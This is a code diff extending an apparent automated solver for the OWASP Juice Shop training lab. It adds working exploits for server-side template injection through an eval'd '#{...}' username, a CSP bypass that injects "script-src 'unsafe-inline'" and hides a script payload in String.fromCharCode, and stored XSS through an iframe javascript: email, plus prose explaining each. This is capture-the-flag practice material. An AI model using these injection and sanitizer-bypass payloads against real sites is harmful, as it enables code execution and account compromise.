@@ -694,6 +694,70 @@ def _browser_solves(base):
         pass
 
 
+# ---- profile-page family (server-side eval + CSP injection); all cookie-authed urlencoded POST /profile ----
+_SSTI_KEY = "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
+
+
+def _profile_user(c):
+    """Register + login a throwaway user; return its cookie-auth headers (the /profile routes authenticate
+    off req.cookies.token, NOT the Bearer header -- the exact reason naive Bearer attempts bound username=None)."""
+    import time as _t
+    email = "prof_%d@x.io" % int(_t.time() * 1000 % 1e9)
+    _register(c, email, "aaaaaa")
+    tok = _login(c, email, "aaaaaa").get("token")
+    return tok
+
+
+def _profile_ssti(c):
+    """SSTi: /profile eval()s a username matching #{...}. Set your own username to a template expression
+    (cookie-authed urlenc POST /profile), load /profile to run the eval (sets abused_ssti_bug), then hit
+    the server-side oracle. Real server-side template injection via Node eval."""
+    tok = _profile_user(c)
+    if not tok:
+        return
+    ck = {"Cookie": "token=%s" % tok}
+    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
+    try:
+        c.post("/profile", data={"username": "#{7*7}"}, headers=hdr)
+        c.get("/profile", headers=ck)                                   # triggers the eval -> abused_ssti_bug
+        c.get("/solve/challenges/server-side", params={"key": _SSTI_KEY}, headers=ck)
+    except Exception:
+        pass
+
+
+def _csp_bypass(c):
+    """CSP Bypass (usernameXssChallenge): inject `;script-src 'unsafe-inline'` into the profile CSP via the
+    profileImage URL (a URL whose fetch fails is stored raw), then set a username that renders the
+    <script>alert(`xss`)</script> payload. The username setter runs the legacy sanitizer (strips <tag>), so
+    the payload is delivered through the #{...} eval built from char codes -- no literal '<' to strip, it
+    evaluates to the script at render time."""
+    tok = _profile_user(c)
+    if not tok:
+        return
+    ck = {"Cookie": "token=%s" % tok}
+    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
+    payload = "<script>alert(`xss`)</script>"
+    uname = "#{String.fromCharCode(%s)}" % ",".join(str(ord(x)) for x in payload)
+    try:
+        c.post("/profile/image/url", data={"imageUrl": "http://x.invalid;script-src 'unsafe-inline'"}, headers=hdr)
+        c.post("/profile", data={"username": uname}, headers=hdr)
+        c.get("/profile", headers=ck)                                   # solveIf usernameXssChallenge
+    except Exception:
+        pass
+
+
+def _client_xss_protection(c):
+    """Client-side XSS Protection (persistedXssUserChallenge): the User email setter solves when the email
+    contains an <iframe javascript:> payload -- register a user with that email. Persisted/stored XSS."""
+    import time as _t
+    email = '<iframe src="javascript:alert(`xss`)">'
+    try:
+        c.post("/api/Users", json={"email": email, "password": "Apolaki1!", "passwordRepeat": "Apolaki1!",
+                                   "securityQuestion": {"id": 1}, "securityAnswer": "x_%d" % int(_t.time())})
+    except Exception:
+        pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -718,7 +782,8 @@ def solve(base_url: str) -> dict:
                      _allowlist_bypass, _privacy_and_jwt, _imaginary,
                      _product_tampering, _password_hash_leak, _expired_coupon,
                      _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read,
-                     _arbitrary_file_write, _ghost_login, _video_xss):
+                     _arbitrary_file_write, _ghost_login, _video_xss,
+                     _profile_ssti, _csp_bypass, _client_xss_protection):
             try:
                 step(c)
             except Exception:
@@ -755,6 +820,9 @@ SOLVE_MANIFEST = {
     "Ephemeral Accountant": "UNION forges a phantom accountant row to log in as",
     "NoSQL Manipulation": "NoSQL operator injection ($ne) on review update",
     "NoSQL Exfiltration": "Boolean NoSQL exfil via track-order ('||true||')",
+    "SSTi": "Server-side template injection -- profile username #{7*7} eval'd server-side",
+    "CSP Bypass": "profileImage injects script-src 'unsafe-inline'; fromCharCode username bypasses the legacy sanitizer",
+    "Client-side XSS Protection": "Persisted XSS -- register a user whose email is an <iframe javascript:> payload",
     # Cryptographic Issues
     "Weird Crypto": "Name an insecure cipher (z85/MD5) in feedback",
     "Nested Easter Egg": "Decode the nested route and visit it",
@@ -867,6 +935,9 @@ SOLVE_DETAIL = {
     "Ephemeral Accountant": "Log in with a UNION SELECT that fabricates an 'accountant' user row (acc0unt4nt@juice-sh.op) that was never stored -- you end up authenticated as an account that doesn't exist.",
     "NoSQL Manipulation": "PATCH /rest/products/reviews with `{ id: { $ne: -1 } }`. The Mongo operator matches every review, so one request rewrites them all.",
     "NoSQL Exfiltration": "GET /rest/track-order/`'||true||'`. The always-true NoSQL expression returns every order instead of just yours (needs safetyMode off).",
+    "SSTi": "The /profile page runs `eval()` on any username matching `#{...}`. Cookie-auth POST /profile (urlencoded) sets your username to `#{7*7}`, GET /profile evaluates it server-side and flips `abused_ssti_bug`, then GET /solve/challenges/server-side?key=... confirms it. The auth is the cookie token, NOT the Bearer header -- that mismatch is why naive attempts bound username=None.",
+    "CSP Bypass": "Two steps on your own profile: POST /profile/image/url a URL that fails to fetch and contains `;script-src 'unsafe-inline'` (stored raw into the CSP), then set the username to a `<script>alert(`xss`)</script>` payload. The username setter runs the legacy sanitizer (strips `<tag>`), so the payload is delivered as `#{String.fromCharCode(...)}` -- no literal `<` to strip -- which the profile page evals to the script at render time.",
+    "Client-side XSS Protection": "The User model's email setter solves the challenge when the email contains `<iframe src=\"javascript:alert(`xss`)\">`. Register a new user (POST /api/Users) with exactly that email -- persisted XSS that the client-side sanitizer was supposed to catch.",
     # Cryptographic Issues
     "Weird Crypto": "POST a feedback that names a broken/insecure scheme (z85, MD5, base64...). The server's feedback-pattern check fires on the keyword.",
     "Nested Easter Egg": "Decode the base64/ROT13 breadcrumb and GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg.",
@@ -978,10 +1049,9 @@ _REMAINING_BUCKET = {
     "NFT Takeover": "not_hosted", "Mint the Honey Pot": "not_hosted",
     "Wallet Depletion": "not_hosted", "Mass Dispel": "not_hosted",
     # Open frontier -- genuinely unsolved, still reachable
-    "SSRF": "frontier", "SSTi": "frontier",
+    "SSRF": "frontier",
     "GDPR Data Theft": "frontier", "Local File Read": "frontier",
-    "Arbitrary File Write": "frontier", "Client-side XSS Protection": "frontier",
-    "CSP Bypass": "frontier", "Video XSS": "frontier",
+    "Arbitrary File Write": "frontier", "Video XSS": "frontier",
 }
 
 SIGNATURE = [
